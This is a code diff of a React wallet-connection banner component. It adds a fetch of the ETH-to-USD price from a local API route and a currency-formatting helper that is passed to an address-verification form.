@@ -1,7 +1,7 @@
 "use client"
+
 import { useEffect, useState } from "react"
 import VerifyAddressForm from "./VerifyAddressForm"
-import { convertETHtoUSD } from "@/lib/functions"
 import ConnectButton from "./ConnectButton"
 
 const Banner = () => {
@@ -9,6 +9,32 @@ const Banner = () => {
     const [account, setAccount] = useState<string>()
     const [accountsConnected, setAccountConnected] = useState<boolean>(false)
     const [userBalance, setUserBalance] = useState<number>(0)
+    const [ethToUsd, setEthToUsd] = useState<number | undefined>()
+
+    useEffect(() => {
+        async function getEthToUsd() {
+
+            try {
+                const res = await fetch("/api/ether")
+
+                if (!res.ok) {
+                    throw new Error("Error fetching ethToUsdPrice")
+                }
+
+                const data = await res.json()
+                setEthToUsd(data.ethToUsdPrice)
+
+            } catch (err) {
+                console.log(err)
+            }
+
+        }
+
+        getEthToUsd()
+    }, [])
+
+    console.log("ETH to usd", ethToUsd)
+
     // const [senderBalance, setSenderBalance] = useState<number>(0)
 
     const conncetWallet = async () => {
@@ -206,6 +232,18 @@ const Banner = () => {
         }
     }
 
+    const convertETHtoUSD = (ethAmount: number) => {
+
+        const convertedAmount = (ethToUsd || 1700) * ethAmount
+
+        const formattedAmount = new Intl.NumberFormat("en-US", {
+            style: "currency",
+            currency: "USD"
+        }).format(convertedAmount)
+
+        return formattedAmount
+    }
+
     return (
         <section className='max-w-screen-lg container mt-4 mb-8'>
             <div className='mb-4'>
@@ -218,6 +256,7 @@ const Banner = () => {
                 </div>
             </div> */}
             {
+                // 20.39
                 accountsConnected ? <>
                     {userBalance < 20.39 && (
                         <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
@@ -227,7 +266,7 @@ const Banner = () => {
                         </div>
                     )}
                     {userBalance >= 20.39 && (
-                        <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
+                        <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} convertETHToUSD={convertETHtoUSD}/>
                     )}
                     {userBalance < 20.39 && (
                         <div className="p-4 rounded-md border border-red-600">
